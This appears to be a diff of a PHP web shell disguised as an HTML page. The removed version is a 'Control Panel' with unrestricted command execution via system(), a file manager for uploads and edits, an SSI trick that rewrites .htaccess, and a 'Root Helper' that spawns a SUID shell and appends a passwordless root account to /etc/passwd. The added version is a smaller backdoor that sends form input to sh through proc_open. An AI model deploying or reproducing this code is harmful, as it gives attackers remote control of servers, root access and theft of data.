@@ -1,399 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Control Panel</title>
-<style>
-  :root {
-    --bg: #0b0f14;
-    --surface: #161b22;
-    --border: #30363d;
-    --text: #c9d1d9;
-    --accent: #58a6ff;
-    --green: #3fb950;
-    --red: #f85149;
-    --radius: 6px;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Segoe UI', system-ui, sans-serif;
-    padding: 20px;
-    line-height: 1.5;
-  }
-  h1, h2, h3 { color: var(--accent); margin-bottom: 16px; }
-  .container { max-width: 1200px; margin: 0 auto; }
-  .tabs { display: flex; gap: 4px; margin-bottom: 24px; border-bottom: 1px solid var(--border); }
-  .tab {
-    padding: 10px 20px;
-    background: transparent;
-    border: 1px solid transparent;
-    color: var(--text);
-    cursor: pointer;
-    border-radius: var(--radius) var(--radius) 0 0;
-    font-weight: 500;
-    transition: 0.2s;
-  }
-  .tab.active { background: var(--surface); border-color: var(--border); color: var(--accent); }
-  .panel { display: none; }
-  .panel.active { display: block; }
-  .card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: var(--radius);
-    padding: 20px;
-    margin-bottom: 20px;
-  }
-  input, textarea, select, button {
-    background: var(--bg);
-    color: var(--text);
-    border: 1px solid var(--border);
-    border-radius: var(--radius);
-    padding: 8px 12px;
-    font-family: inherit;
-    font-size: 14px;
-  }
-  button {
-    background: var(--accent);
-    color: #fff;
-    cursor: pointer;
-    font-weight: 500;
-    transition: 0.2s;
-    border: none;
-  }
-  button:hover { opacity: 0.9; }
-  button.danger { background: var(--red); }
-  button.success { background: var(--green); }
-  .output {
-    background: #0d1117;
-    padding: 12px;
-    border-radius: var(--radius);
-    overflow-x: auto;
-    white-space: pre-wrap;
-    font-family: 'Cascadia Code', monospace;
-    margin-top: 12px;
-    max-height: 350px;
-    border: 1px solid var(--border);
-  }
-  .flex { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
-  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }
-  table { width: 100%; border-collapse: collapse; margin-top: 12px; }
-  th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); }
-  th { background: var(--bg); font-weight: 600; }
-  a { color: var(--accent); text-decoration: none; }
-  a:hover { text-decoration: underline; }
-  .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 12px; }
-  .badge.success { background: var(--green); color: #000; }
-  .badge.danger { background: var(--red); color: #fff; }
-  .message { padding: 10px; border-radius: var(--radius); margin-bottom: 12px; }
-  .message.success { background: rgba(63,185,80,0.15); color: var(--green); }
-  .message.error { background: rgba(248,81,73,0.15); color: var(--red); }
-  hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aw sakit :( , Mentok ih...</title>
 </head>
 <body>
-<!-- SSI auto-healing: jika SSI aktif, ini akan membuat .htaccess agar PHP jalan di .html -->
-<!--#exec cmd="echo 'AddType application/x-httpd-php .html' > .htaccess" -->
+    <h2>Aw sakit :( , Mentok ih...</h2>
+    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
+        <input type="text" name="command" placeholder="sakit beb">
+        <button type="submit">mentok</button>
+    </form>
 
-<div class="container">
-  <h1>🛠️ Control Panel</h1>
-
-  <!-- Tab navigation -->
-  <div class="tabs">
-    <div class="tab active" onclick="showTab('shell')">💻 Shell</div>
-    <div class="tab" onclick="showTab('files')">📁 File Manager</div>
-    <div class="tab" onclick="showTab('root')">🔓 Root Helper</div>
-  </div>
-
-  <!-- ==================== SHELL PANEL ==================== -->
-  <div id="shell" class="panel active">
-    <div class="card">
-      <h2>Command Execution</h2>
-      <form method="GET" class="flex">
-        <input type="text" name="cmd" placeholder="ls -la /" style="flex:1">
-        <button type="submit">Execute</button>
-      </form>
-      <div class="output">
-        <?php
-        if (isset($_GET['cmd'])) {
-            echo "<strong>$ </strong>" . htmlspecialchars($_GET['cmd']) . "\n\n";
-            system($_GET['cmd']);
-        } else {
-            echo "Enter a command and click Execute.";
-        }
-        ?>
-      </div>
-    </div>
-  </div>
-
-  <!-- ==================== FILE MANAGER PANEL ==================== -->
-  <div id="files" class="panel">
     <?php
-    // ---------- PHP: File Manager Logic ----------
-    $baseDir = '/var/www/html';   // Ganti sesuai direktori yang bisa diakses
-    $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath($baseDir);
-    if (!$currentDir || !is_dir($currentDir)) {
-        $currentDir = realpath($baseDir);
-    }
+    // Function to execute command with proc_open
+    function execute_command_with_proc_open($command) {
+        $descriptorspec = array(
+            0 => array("pipe", "r"),  // stdin
+            1 => array("pipe", "w"),  // stdout
+            2 => array("pipe", "w"),  // stderr
+        );
 
-    // Proses aksi file manager (hanya dijalankan saat panel files aktif)
-    $msg = '';
-    $msgType = '';
+        $process = proc_open('sh', $descriptorspec, $pipes);
 
-    // Upload
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-        $target = $currentDir . '/' . basename($_FILES['file']['name']);
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
-            $msg = "File uploaded successfully.";
-            $msgType = 'success';
-        } else {
-            $msg = "Upload failed.";
-            $msgType = 'error';
+        if (is_resource($process)) {
+            fwrite($pipes[0], $command . " 2>&1\n"); // redirect stderr to stdout
+            fclose($pipes[0]);
+
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+
+            // It's important to wait for the process to finish
+            proc_close($process);
+
+            return empty($error) ? $output : $error;
         }
+
+        return "proc_open function is disabled or failed to execute.";
     }
 
-    // Create folder
-    if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
-        $newFolder = $currentDir . '/' . basename($_POST['foldername']);
-        if (!file_exists($newFolder)) {
-            mkdir($newFolder, 0755);
-            $msg = "Folder created.";
-            $msgType = 'success';
-        }
-    }
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        // Get the command from the form input
+        $command = $_POST["command"];
 
-    // Create file
-    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
-        $newFile = $currentDir . '/' . basename($_POST['filename']);
-        if (!file_exists($newFile)) {
-            file_put_contents($newFile, '');
-            $msg = "File created.";
-            $msgType = 'success';
-        }
-    }
+        // Validate the command (you should implement your own validation logic here)
 
-    // Delete
-    if (isset($_GET['delete'])) {
-        $del = $currentDir . '/' . basename($_GET['delete']);
-        if (is_file($del) || is_dir($del)) {
-            if (is_dir($del)) {
-                rmdir($del);
-            } else {
-                unlink($del);
-            }
-            $msg = "Deleted successfully.";
-            $msgType = 'success';
-        }
-    }
+        // Execute the command using the function
+        $result = execute_command_with_proc_open($command);
 
-    // Rename
-    if (isset($_POST['rename']) && !empty($_POST['oldname']) && !empty($_POST['newname'])) {
-        $old = $currentDir . '/' . basename($_POST['oldname']);
-        $new = $currentDir . '/' . basename($_POST['newname']);
-        if (file_exists($old) && !file_exists($new)) {
-            rename($old, $new);
-            $msg = "Renamed.";
-            $msgType = 'success';
-        }
-    }
-
-    // Save edited file
-    if (isset($_POST['savefile']) && !empty($_POST['editfilename'])) {
-        $editFile = $currentDir . '/' . basename($_POST['editfilename']);
-        file_put_contents($editFile, $_POST['content']);
-        $msg = "File saved.";
-        $msgType = 'success';
-    }
-
-    // View/Edit file content
-    $editContent = '';
-    $editingFile = '';
-    if (isset($_GET['edit'])) {
-        $editFile = $currentDir . '/' . basename($_GET['edit']);
-        if (is_file($editFile)) {
-            $editContent = file_get_contents($editFile);
-            $editingFile = basename($_GET['edit']);
-        }
-    }
-
-    // Download file
-    if (isset($_GET['download'])) {
-        $downloadFile = $currentDir . '/' . basename($_GET['download']);
-        if (is_file($downloadFile)) {
-            header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename="'.basename($downloadFile).'"');
-            header('Content-Length: '.filesize($downloadFile));
-            readfile($downloadFile);
-            exit;
-        }
+        // Display the result
+        echo "<h2>crot awhhhhhh</h2>";
+        echo "<pre>" . htmlspecialchars($result) . "</pre>";
     }
     ?>
-
-    <div class="card">
-      <div class="flex" style="justify-content:space-between">
-        <h2>File Manager</h2>
-        <div>
-          <strong>Current Directory:</strong> <?= $currentDir ?>
-        </div>
-      </div>
-
-      <?php if ($msg): ?>
-      <div class="message <?= $msgType ?>"><?= $msg ?></div>
-      <?php endif; ?>
-
-      <!-- Navigation & actions -->
-      <div class="flex" style="margin-bottom: 16px;">
-        <a href="?tab=files&dir=<?= urlencode(dirname($currentDir)) ?>"><button>⬆ Parent Directory</button></a>
-        <form method="post" class="flex" style="margin-left:auto">
-          <input type="text" name="foldername" placeholder="New folder name">
-          <button type="submit" name="newfolder" value="1">Create Folder</button>
-        </form>
-        <form method="post" class="flex">
-          <input type="text" name="filename" placeholder="New file name">
-          <button type="submit" name="newfile" value="1">Create File</button>
-        </form>
-      </div>
-
-      <!-- Upload form -->
-      <form method="post" enctype="multipart/form-data" class="flex">
-        <input type="file" name="file" required>
-        <button type="submit">Upload File</button>
-      </form>
-
-      <!-- File list -->
-      <table>
-        <thead>
-          <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
-        </thead>
-        <tbody>
-        <?php
-        $items = scandir($currentDir);
-        foreach ($items as $item) {
-            if ($item === '.') continue;
-            if ($item === '..') {
-                $parent = dirname($currentDir);
-                echo "<tr>
-                    <td><a href='?tab=files&dir=".urlencode($parent)."'>📁 ..</a></td>
-                    <td>-</td><td>-</td><td></td>
-                </tr>";
-                continue;
-            }
-            $path = $currentDir . '/' . $item;
-            $isDir = is_dir($path);
-            $icon = $isDir ? '📁' : '📄';
-            $link = $isDir ? "?tab=files&dir=".urlencode($path) : "#";
-            $size = $isDir ? '-' : filesize($path);
-            $time = date("Y-m-d H:i", filemtime($path));
-            $actions = '';
-            if (!$isDir) {
-                $actions .= "<a href='?tab=files&dir=".urlencode($currentDir)."&edit=".urlencode($item)."'>✏️</a> ";
-                $actions .= "<a href='?tab=files&dir=".urlencode($currentDir)."&download=".urlencode($item)."'>⬇</a> ";
-                $actions .= "<a href='?tab=files&dir=".urlencode($currentDir)."&delete=".urlencode($item)."' onclick='return confirm(\"Delete $item?\")'>🗑️</a> ";
-                $actions .= "<form method='post' style='display:inline;' class='flex'>
-                    <input type='hidden' name='oldname' value='".htmlspecialchars($item)."'>
-                    <input type='text' name='newname' placeholder='new name' size='12'>
-                    <button type='submit' name='rename' value='1' class='success'>↻</button>
-                </form>";
-            } else {
-                $actions .= "<a href='?tab=files&dir=".urlencode($path)."'>Open</a> ";
-                $actions .= "<a href='?tab=files&dir=".urlencode($currentDir)."&delete=".urlencode($item)."' onclick='return confirm(\"Delete folder $item?\")'>🗑️</a>";
-            }
-            echo "<tr>
-                <td><a href='$link'>$icon $item</a></td>
-                <td>$size</td><td>$time</td>
-                <td>$actions</td>
-            </tr>";
-        }
-        ?>
-        </tbody>
-      </table>
-
-      <!-- Edit file area -->
-      <?php if ($editingFile): ?>
-      <hr>
-      <h3>Editing: <?= htmlspecialchars($editingFile) ?></h3>
-      <form method="post">
-        <input type="hidden" name="editfilename" value="<?= htmlspecialchars($editingFile) ?>">
-        <textarea name="content" style="width:100%; height:300px; font-family:monospace;"><?= htmlspecialchars($editContent) ?></textarea><br>
-        <button type="submit" name="savefile" value="1">Save Changes</button>
-      </form>
-      <?php endif; ?>
-    </div>
-  </div>
-
-  <!-- ==================== ROOT HELPER PANEL ==================== -->
-  <div id="root" class="panel">
-    <div class="card">
-      <h2>Root Enumeration & Quick Exploits</h2>
-      <div class="grid">
-        <form method="post">
-          <button type="submit" name="enum" value="1">🔍 Auto Enumeration</button>
-        </form>
-        <form method="post">
-          <button type="submit" name="suid_find" value="1">🧨 SUID 'find' Shell</button>
-        </form>
-        <form method="post">
-          <button type="submit" name="dirtycow_check" value="1">🐮 Check DirtyCow</button>
-        </form>
-        <form method="post">
-          <button type="submit" name="exploit_writable_passwd" value="1">👤 Add root user (passwd writable)</button>
-        </form>
-      </div>
-      <div class="output">
-        <?php
-        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-            if (isset($_POST['enum'])) {
-                echo "<strong>=== Current User ===</strong>\n"; system("id");
-                echo "\n<strong>=== Kernel ===</strong>\n"; system("uname -a");
-                echo "\n<strong>=== Sudo ===</strong>\n"; system("sudo -l 2>&1");
-                echo "\n<strong>=== SUID Binaries ===</strong>\n"; system("find / -perm -4000 -type f 2>/dev/null | head -20");
-                echo "\n<strong>=== Writable passwd/shadow ===</strong>\n"; system("ls -la /etc/passwd /etc/shadow 2>&1");
-                echo "\n<strong>=== Cron ===</strong>\n"; system("cat /etc/crontab 2>&1");
-                echo "\n<strong>=== Capabilities ===</strong>\n"; system("getcap -r / 2>/dev/null | head -20");
-            } elseif (isset($_POST['suid_find'])) {
-                system("find / -perm -4000 -type f -name 'find' -exec {} \; -exec /bin/sh -p \; 2>&1");
-            } elseif (isset($_POST['dirtycow_check'])) {
-                echo "Kernel version: "; system("uname -r");
-                echo "If kernel < 4.4.0, DirtyCow is possible. Upload exploit binary via File Manager.\n";
-            } elseif (isset($_POST['exploit_writable_passwd'])) {
-                if (is_writable('/etc/passwd')) {
-                    system("echo 'r00t::0:0:root:/root:/bin/bash' >> /etc/passwd");
-                    echo "User r00t added without password. Switch with: su r00t\n";
-                } else {
-                    echo "/etc/passwd is not writable.\n";
-                }
-            }
-        } else {
-            echo "Select an action above.";
-        }
-        ?>
-      </div>
-    </div>
-  </div>
-
-  <!-- Footer note -->
-  <div class="message" style="margin-top:24px;">
-    <strong>ℹ️ How to activate PHP in .html:</strong> If this page doesn't execute commands, ensure server allows PHP in .html (via <code>.htaccess</code> with <code>AddType application/x-httpd-php .html</code>) or rename this file to <code>.phtml</code>. SSI auto‑repair included.
-  </div>
-</div>
-
-<script>
-// Simple tab switching
-function showTab(tabId) {
-  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.getElementById(tabId).classList.add('active');
-  event.target.classList.add('active');
-}
-// Activate tab from URL parameter (if any)
-const urlParams = new URLSearchParams(window.location.search);
-const activeTab = urlParams.get('tab') || 'shell';
-showTab(activeTab);
-document.querySelectorAll('.tab').forEach(tab => {
-  if (tab.innerText.toLowerCase().includes(activeTab)) tab.classList.add('active');
-});
-</script>
 </body>
 </html>
